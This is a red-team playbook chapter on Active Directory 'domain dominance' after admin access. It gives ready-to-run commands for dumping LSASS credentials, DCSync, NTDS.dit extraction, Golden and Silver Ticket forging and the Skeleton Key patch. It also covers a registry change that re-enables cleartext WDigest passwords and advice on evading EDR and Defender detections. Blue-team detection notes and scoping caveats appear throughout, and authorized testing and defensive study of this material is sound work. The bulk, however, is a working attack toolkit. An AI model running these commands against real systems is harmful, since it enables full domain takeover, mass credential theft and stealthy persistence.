# Phase 7: Domain Dominance

> You have DA, EA, or DC machine account access. Now extract every credential and prove impact.

---

## Table of Contents
1. [Credential Dumping (LSASS)](#1-credential-dumping-lsass)
2. [DCSync](#2-dcsync)
3. [NTDS.dit Extraction](#3-ntdsdit-extraction)
4. [Golden Ticket](#4-golden-ticket)
5. [Silver Ticket](#5-silver-ticket)
6. [Skeleton Key](#6-skeleton-key)

---

## 1. Credential Dumping (LSASS)

**Concept**: LSASS (Local Security Authority Subsystem Service) holds in-memory credentials for every logged-on user — including their NTLM hash, Kerberos keys, and (on older systems) cleartext passwords via WDigest.

### Methods, from loudest to quietest

```powershell
# Mimikatz — the classic. Loudest. Caught by every EDR's default policy.
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
sekurlsa::dpapi
```

```cmd
# comsvcs.dll trick — uses signed Microsoft DLL (LOLBin)
# Get LSASS PID first, then:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
# Transfer lsass.dmp off-host, parse offline:
pypykatz lsa minidump lsass.dmp
```

```cmd
# Task Manager (manual, blue-team-friendly)
# Right-click lsass.exe → Create dump file → grab C:\Users\...\lsass.DMP
# Parse offline with pypykatz
```

```cmd
# Sysinternals ProcDump (signed MS binary)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```cmd
# nanodump — designed for stealth (forks LSASS, filters DLL imports, etc.)
nanodump.exe -w C:\Temp\lsass.dmp
```

### Parse offline (Linux)
```bash
pypykatz lsa minidump lsass.dmp
# Output includes NTLM hashes, AES keys, Kerberos tickets, cleartext where present
```

🔴 **OPSEC**: LSASS access by any non-MS process is the #1 EDR alert. Even signed methods like comsvcs.dll get caught now. EDRs hook `MiniDumpWriteDump` API and watch for `OpenProcess(PROCESS_VM_READ)` on LSASS.

**Detection (Blue Team)**:
- Sysmon Event 10 (ProcessAccess) targeting lsass.exe with rights `0x1010` or `0x1410`
- Microsoft Defender / EDRs alert specifically on common dumper signatures
- WDigest cleartext is disabled by default since Win 8.1/2012R2 — `HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0`

**Pro tip**: Re-enable WDigest if you have admin → users who log in *afterward* leave cleartext in LSASS:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

---

## 2. DCSync

**Concept**: AD replication protocol (`DRSUAPI`) lets DCs sync their data. The `IDL_DRSGetNCChanges` RPC call pulls account password data. Anyone with the right ACLs (DA, EA, DC machine accounts, custom-granted users) can request this **remotely** from any DC — getting password hashes for any user.

### Required rights
- `DS-Replication-Get-Changes` (GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
- `DS-Replication-Get-Changes-All` (GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

### Linux (Impacket)
```bash
# Dump everything (all user hashes, krbtgt, machine accounts)
secretsdump.py lab.local/administrator:Password1@10.10.10.10

# With hash instead of password
secretsdump.py -hashes :8d969eef6ecad3c29a3a629280e686cf \
  lab.local/administrator@10.10.10.10

# Just krbtgt (for Golden Ticket)
secretsdump.py lab.local/administrator:Password1@10.10.10.10 -just-dc-user krbtgt

# Just NTDS, skip SAM/SECURITY (faster)
secretsdump.py lab.local/administrator:Password1@10.10.10.10 -just-dc-ntlm
```

### Windows (Mimikatz)
```powershell
lsadump::dcsync /user:krbtgt /domain:lab.local
lsadump::dcsync /user:administrator /domain:lab.local
lsadump::dcsync /all /csv /domain:lab.local                # everyone
```

Output format you'll see (for each account):
- NTLM hash
- LM hash (usually empty)
- AES128 / AES256 keys
- Password history (NTLM of last 24 passwords)

🔴 **OPSEC**: DCSync = Event 4662 on the DC with the replication GUIDs above. Defender for Identity has direct "Suspected DCSync attack (replication of directory services)" alerts. Some SIEMs whitelist DC machine accounts and only alert on user accounts → flag any non-DC source as immediately suspicious.

**Detection (Blue Team)**:
- 4662 with `Properties: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` from a non-DC principal
- Sudden DRSR traffic from a non-DC IP

---

## 3. NTDS.dit Extraction

**Concept**: The AD database. Contains all account hashes. Extract directly when you have access to a DC's filesystem (alternative to DCSync, useful if DCSync is monitored).

### Methods

```cmd
# Volume Shadow Copy (on the DC, as admin)
vssadmin create shadow /for=C:
:: Note shadow copy name e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\Temp\
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Temp\
vssadmin delete shadows /shadow={GUID} /quiet
```

```cmd
# ntdsutil (built-in)
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
```

```powershell
# Diskshadow (built-in)
diskshadow.exe /s C:\Temp\diskshadow.txt
```

Then transfer `ntds.dit` + `SYSTEM` hive off-host:
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### Remote via Impacket
```bash
# Forces VSS on the DC
secretsdump.py -use-vss lab.local/administrator:Password1@dc01.lab.local
```

🔴 **OPSEC**: VSS creation is logged (Event 8222 in `Microsoft-Windows-VSS`). `ntdsutil` runs are logged in `Directory-Service`. Sysmon 11 (FileCreate) on `*.dit` reads from DC anomalies.

---

## 4. Golden Ticket

**Concept**: Forge a Kerberos TGT signed with the `krbtgt` account's key. The KDC accepts it as legitimate because *the KDC itself is krbtgt*. Valid for **any user, any service**, for the configured lifetime (default forged: 10 years).

### Prerequisites
- `krbtgt` NTLM hash (from DCSync)
- Domain SID

### Get the domain SID
```bash
lookupsid.py 'lab.local/jdoe:Password1@10.10.10.10' | grep "Domain SID"
```
```powershell
Get-DomainSID
```

### Forge

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:lab.local \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /krbtgt:<krbtgt_NTLM_hash> /ptt

# With Enterprise Admin group SID for forest-wide power
kerberos::golden /user:administrator /domain:lab.local /sid:S-1-5-21-... \
  /krbtgt:<hash> /groups:512,513,518,519,520 /ptt
```

```bash
# Impacket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain lab.local administrator
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass dc01.lab.local
```

```powershell
# Rubeus
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:lab.local /sid:S-1-5-21-... \
  /user:administrator /ptt
```

### Properties
- Survives the user's password change (you forged a TGT, not their TGT)
- Survives the user being deleted
- Survives **one** krbtgt password reset (because of two-keys-in-AD design). Resetting krbtgt **twice** kills all golden tickets
- Default forged lifetime: 10 years

🔴 **OPSEC**: Detected by Defender for Identity: "Suspected Golden Ticket usage (encryption downgrade)" and "Suspected use of a forged ticket". Modern detections look for:
- Tickets with unusual lifetime (10 years vs domain policy)
- Tickets where the AS-REQ event is missing on the DC but a TGS-REQ event references that TGT
- RC4 encryption when domain is AES-only

**Use AES (`/aes256:<key>`)** to evade encryption-downgrade alerts.

---

## 5. Silver Ticket

**Concept**: Forge a TGS for a specific service. Bypasses the KDC entirely — you sign the TGS with the service account's own key. Stealthier than Golden because the DC never sees the ticket creation.

### Prerequisites
- Service account NTLM hash (or AES key)
- Target SPN

```powershell
# Mimikatz — CIFS service on WS01
kerberos::golden /user:administrator /domain:lab.local /sid:S-1-5-21-... \
  /target:ws01.lab.local /service:cifs /rc4:<WS01$_machine_hash> /ptt

# HTTP/WinRM service
kerberos::golden ... /service:http /target:ws01.lab.local /rc4:<hash> /ptt

# MSSQL
kerberos::golden ... /service:mssqlsvc /target:db01.lab.local:1433 /rc4:<hash> /ptt
```

```bash
# Impacket
ticketer.py -nthash <hash> -domain-sid S-1-5-21-... -domain lab.local -spn cifs/ws01.lab.local administrator
```

Common services to forge:
- `cifs` — file share access
- `host` — execute commands via Scheduled Tasks
- `http` — WinRM, OWA
- `ldap` — LDAP queries (potentially DCSync if forged for DC)
- `mssqlsvc` — SQL
- `wsman` — WinRM

🟡 **OPSEC**: KDC never sees the ticket (Silver is unique among Golden/Silver in this). Detection relies on **service-side logs**: Event 4624 for the impersonated user with no preceding 4768 (TGT) on the DC.

---

## 6. Skeleton Key

**Concept**: Patch LSASS on the DC so that any account accepts a master password (default: `mimikatz`). The legitimate password also still works.

```powershell
# On DC, as DA
privilege::debug
misc::skeleton
# Now any account authenticates with password "mimikatz"
```

💀 **OPSEC**: Extremely loud. Multiple side effects:
- Forces RC4 for Kerberos auth (encryption downgrade alerts everywhere)
- Doesn't survive DC reboot (memory-only patch)
- Detection signatures exist in every EDR

Used almost exclusively in research / labs. Not recommended for real engagements.

---

## Demonstrating Impact (Reporting)

After you have DA:
- DCSync → grab krbtgt + every user hash (proves data exfil capability)
- Pull `ntds.dit` (proves access to the AD database)
- Show one Golden Ticket auth (proves complete persistence)
- Find and exfil "crown jewel" data per scope (specific shares, databases)
- **Don't** disable DA accounts, plant ransomware, or break things
- Document each step with screenshots + timestamps for the report

→ Continue to **Phase 8: Persistence** (`08-persistence.md`) only if scope includes "demonstrate persistence". Otherwise → **Phase 12: Reporting** (`12-reporting.md`).
